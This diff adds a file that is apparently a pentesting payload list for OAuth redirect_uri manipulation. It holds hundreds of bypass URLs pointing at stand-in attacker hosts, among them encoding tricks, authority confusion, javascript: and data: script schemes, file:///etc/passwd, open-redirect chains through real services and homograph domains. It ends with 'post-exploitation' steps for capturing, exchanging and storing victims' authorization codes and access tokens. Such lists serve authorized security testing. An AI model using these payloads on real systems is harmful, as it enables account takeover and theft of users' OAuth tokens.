@@ -1,0 +1,399 @@
+# OAuth Redirect URI Manipulation Payloads
+# Comprehensive collection for authorized security testing
+# Test against OAuth authorization endpoints (redirect_uri parameter)
+
+# ============================================================================
+# BASIC REDIRECT URI MANIPULATION
+# ============================================================================
+
+# Original: https://target.com/callback
+
+# Direct attacker domain substitution
+https://attacker.com/callback
+https://evil.com/callback
+http://attacker.com/callback
+https://attacker.com
+https://evil.com
+
+# ============================================================================
+# SUBDOMAIN MANIPULATION
+# ============================================================================
+
+# Assuming target.com is allowed
+
+# Subdomain variations
+https://attacker.target.com/callback
+https://evil.target.com/callback
+https://anything.target.com/callback
+https://www.target.com.attacker.com/callback
+https://target.com.attacker.com/callback
+https://target-com.attacker.com/callback
+
+# Subdomain takeover targets
+https://test.target.com/callback
+https://dev.target.com/callback
+https://staging.target.com/callback
+https://beta.target.com/callback
+https://sandbox.target.com/callback
+https://demo.target.com/callback
+https://api.target.com/callback
+
+# ============================================================================
+# PATH MANIPULATION
+# ============================================================================
+
+# Original: https://target.com/callback
+
+# Path traversal
+https://target.com/callback/../../../attacker
+https://target.com/callback/../../evil
+https://target.com/callback/../attacker
+https://target.com/callback/..;/attacker
+https://target.com/callback/..%2fattacker
+https://target.com/callback/..%252fattacker
+https://target.com/callback%2f..%2f..%2fattacker
+https://target.com/callback/./attacker
+https://target.com/callback/.%2e/attacker
+
+# Path suffix/prefix
+https://target.com/callback-attacker
+https://target.com/callback_attacker
+https://target.com/callbackattacker
+https://target.com/attackercallback
+https://target.com/callback.attacker.com
+https://target.com/callback%00.attacker.com
+https://target.com/callback/.attacker
+https://target.com/callback/attacker
+https://target.com/callback/evil
+https://target.com/callback?attacker=1
+
+# ============================================================================
+# URL ENCODING BYPASSES
+# ============================================================================
+
+# Single encoding
+https://target.com/callback%2f..%2fattacker
+https://target.com%2fcallback
+https://target.com%5ccallback
+https:%2f%2ftarget.com%2fcallback
+https://target.com/%2e%2e/attacker
+https://target.com/callback%23attacker
+
+# Double encoding
+https://target.com/callback%252f..%252fattacker
+https://target.com%252fcallback
+https://target.com/callback%252e%252e/attacker
+https:%252f%252ftarget.com%252fcallback
+
+# Unicode encoding
+https://target.com/callback%c0%af..%c0%afattacker
+https://target.com/callback%e0%80%af..%e0%80%afattacker
+https://target.com/callback%u002f..%u002fattacker
+
+# ============================================================================
+# HOST HEADER / AUTHORITY MANIPULATION
+# ============================================================================
+
+# Different schemes
+http://target.com/callback
+https://target.com/callback
+//target.com/callback
+///target.com/callback
+\\target.com/callback
+/\target.com/callback
+target.com/callback
+
+# Protocol-relative with attacker
+//attacker.com/callback
+///attacker.com/callback
+////attacker.com/callback
+
+# Authority confusion
+https://target.com@attacker.com/callback
+https://attacker.com@target.com/callback
+https://target.com%40attacker.com/callback
+https://attacker.com:443@target.com/callback
+https://target.com:attacker.com/callback
+https://target.com%23@attacker.com/callback
+
+# Credential injection
+https://user:pass@target.com/callback
+https://target.com:password@attacker.com/callback
+
+# ============================================================================
+# FRAGMENT AND QUERY MANIPULATION
+# ============================================================================
+
+# Fragment injection
+https://target.com/callback#https://attacker.com
+https://target.com/callback#//attacker.com
+https://target.com/callback#attacker
+https://target.com/callback%23attacker.com
+
+# Query string manipulation
+https://target.com/callback?redirect=https://attacker.com
+https://target.com/callback?next=https://attacker.com
+https://target.com/callback?url=https://attacker.com
+https://target.com/callback?return=https://attacker.com
+https://target.com/callback?destination=https://attacker.com
+https://target.com/callback?target=https://attacker.com
+https://target.com/callback?rurl=https://attacker.com
+https://target.com/callback?continue=https://attacker.com
+
+# Parameter pollution
+https://target.com/callback?a=1&redirect_uri=https://attacker.com
+
+# ============================================================================
+# PARSER DIFFERENTIAL ATTACKS
+# ============================================================================
+
+# Backslash confusion (Windows path vs URL)
+https://target.com/callback\..\..\..\attacker
+https://target.com\@attacker.com/callback
+https://target.com\/attacker.com/callback
+
+# Slash confusion
+https://target.com/callback//attacker
+https://target.com/callback///attacker
+https:/target.com/callback
+https:///target.com/callback
+https:////target.com/callback
+
+# Null byte injection
+https://target.com/callback%00.attacker.com
+https://target.com/callback%00attacker
+https://target.com/callback\x00attacker
+
+# Tab/newline injection
+https://target.com/callback%09attacker
+https://target.com/callback%0aattacker
+https://target.com/callback%0dattacker
+https://target.com/callback%0d%0aattacker
+
+# ============================================================================
+# SCHEME MANIPULATION
+# ============================================================================
+
+# Non-HTTP schemes
+javascript:alert(document.domain)//
+javascript://attacker.com/%0aalert(1)
+data:text/html,<script>alert(1)</script>
+file:///etc/passwd
+ftp://attacker.com/callback
+ssh://attacker.com/callback
+dict://attacker.com:11111/
+gopher://attacker.com:70/
+ldap://attacker.com/callback
+
+# Custom schemes
+custom://attacker.com/callback
+app://attacker.com/callback
+myapp://callback
+intent://callback#Intent;scheme=https;end
+android-app://com.attacker.app/callback
+
+# Scheme case variations
+HTTPS://target.com/callback
+HtTpS://target.com/callback
+hTtPs://target.com/callback
+
+# ============================================================================
+# OPEN REDIRECT CHAINS
+# ============================================================================
+
+# Chain through known open redirects
+https://target.com/redirect?url=https://attacker.com
+https://target.com/out?to=https://attacker.com
+https://target.com/link?u=https://attacker.com
+https://target.com/go?url=https://attacker.com
+https://target.com/proxy?url=https://attacker.com
+
+# Google open redirects
+https://www.google.com/url?q=https://attacker.com
+https://www.google.com/url?sa=t&url=https://attacker.com
+
+# Known open redirect endpoints
+https://l.instagram.com/?u=https://attacker.com
+https://www.youtube.com/redirect?q=https://attacker.com
+https://slack-redir.net/link?url=https://attacker.com
+
+# ============================================================================
+# IP ADDRESS VARIATIONS
+# ============================================================================
+
+# IPv4 variations
+https://127.0.0.1/callback
+https://localhost/callback
+https://0.0.0.0/callback
+https://[::1]/callback
+https://2130706433/callback  # Decimal for 127.0.0.1
+https://0x7f000001/callback  # Hex for 127.0.0.1
+https://017700000001/callback  # Octal for 127.0.0.1
+https://127.1/callback
+https://127.0.1/callback
+
+# Attacker IP
+https://167772161/callback  # Decimal IP
+https://0xa9fea9fe/callback  # Hex IP
+
+# IPv6
+https://[::ffff:127.0.0.1]/callback
+https://[0:0:0:0:0:ffff:127.0.0.1]/callback
+
+# ============================================================================
+# WILDCARD AND REGEX BYPASS
+# ============================================================================
+
+# If *.target.com is allowed
+https://attacker.com?.target.com/callback
+https://attacker.com#.target.com/callback
+https://attacker.com/.target.com/callback
+https://attacker.com%23.target.com/callback
+https://attacker.com%00.target.com/callback
+
+# If regex like /^https:\/\/.*\.target\.com\// is used
+https://attacker.com#https://.target.com/callback
+https://attacker.com?.target.com/callback
+https://attacker.com/https://.target.com/callback
+
+# ============================================================================
+# SAME-SITE CONTEXT MANIPULATION
+# ============================================================================
+
+# Use target's own endpoints that might redirect
+https://target.com/logout?next=https://attacker.com
+https://target.com/login?redirect=https://attacker.com
+https://target.com/error?url=https://attacker.com
+https://target.com/404?return=https://attacker.com
+
+# API endpoints that might be vulnerable
+https://api.target.com/callback
+https://target.com/api/callback
+https://target.com/api/v1/callback
+https://target.com/api/v2/callback
+https://m.target.com/callback
+https://mobile.target.com/callback
+
+# ============================================================================
+# SPECIAL CHARACTERS IN DOMAIN
+# ============================================================================
+
+# Unicode domain confusion
+https://tаrget.com/callback  # Cyrillic 'а'
+https://target。com/callback  # Fullwidth period
+https://target．com/callback  # Halfwidth period
+https://ⓣarget.com/callback  # Circled letter
+
+# Punycode
+https://xn--trget-55a.com/callback  # Punycode for similar domain
+
+# ============================================================================
+# PORT MANIPULATION
+# ============================================================================
+
+https://target.com:443/callback
+https://target.com:80/callback
+https://target.com:8080/callback
+https://target.com:8443/callback
+https://attacker.com:443/callback
+https://target.com:443@attacker.com/callback
+
+# ============================================================================
+# RESPONSE TYPE MANIPULATION
+# ============================================================================
+
+# These are used in conjunction with redirect_uri
+# response_type variations that might affect redirect handling
+
+# Fragment-based (implicit flow)
+?response_type=token&redirect_uri=https://attacker.com
+?response_type=id_token&redirect_uri=https://attacker.com
+?response_type=token+id_token&redirect_uri=https://attacker.com
+
+# Code-based (authorization code flow)
+?response_type=code&redirect_uri=https://attacker.com
+
+# ============================================================================
+# STATE PARAMETER ATTACKS
+# ============================================================================
+
+# Missing state (CSRF)
+redirect_uri=https://target.com/callback  # No state parameter
+
+# Predictable state
+redirect_uri=https://target.com/callback&state=123
+redirect_uri=https://target.com/callback&state=1
+redirect_uri=https://target.com/callback&state=test
+
+# State injection with redirect
+redirect_uri=https://attacker.com/callback&state=legitimatestate
+
+# ============================================================================
+# COMBINED ATTACK PAYLOADS
+# ============================================================================
+
+# Multiple bypass techniques combined
+https://target.com%2f%2e%2e%2fattacker.com/callback
+https://target.com/callback/..%252f..%252fattacker.com
+https://target.com/callback%00.attacker.com%23
+https://target.com@attacker.com/callback%23
+https://attacker.com%23.target.com/callback
+https://target.com/callback?next=https://attacker.com%23
+https://target.com/callback/../../..//attacker.com
+
+# ============================================================================
+# MOBILE APP REDIRECT SCHEMES
+# ============================================================================
+
+# Custom URL schemes
+myapp://callback
+myapp://oauth/callback
+com.company.app://callback
+fb123456://callback  # Facebook SDK pattern
+com.googleusercontent.apps.123://callback  # Google pattern
+
+# Universal links / App links
+https://target.com/.well-known/apple-app-site-association
+https://target.com/.well-known/assetlinks.json
+
+# ============================================================================
+# TESTING METHODOLOGY
+# ============================================================================
+
+# 1. Test basic substitution first
+# 2. Try subdomain variations
+# 3. Test path traversal
+# 4. Try encoding bypasses
+# 5. Test parser differentials
+# 6. Try open redirect chains
+# 7. Test with different response_types
+# 8. Verify state parameter handling
+
+# ============================================================================
+# BURP COLLABORATOR / INTERACTSH PAYLOADS
+# ============================================================================
+
+# Replace with your Collaborator/interactsh domain
+https://YOUR_ID.oastify.com/callback
+https://YOUR_ID.burpcollaborator.net/callback
+https://YOUR_ID.interact.sh/callback
+
+# Use for blind SSRF detection in redirect_uri
+redirect_uri=https://YOUR_ID.oastify.com
+redirect_uri=http://YOUR_ID.burpcollaborator.net
+
+# ============================================================================
+# POST-EXPLOITATION
+# ============================================================================
+
+# After successful redirect, capture:
+# - Authorization code (code parameter)
+# - Access token (token parameter in fragment)
+# - ID token (id_token parameter)
+# - State value (for session correlation)
+
+# Attacker server should:
+# 1. Log all incoming requests
+# 2. Capture fragment values via JavaScript
+# 3. Exchange authorization codes quickly
+# 4. Store tokens for later use
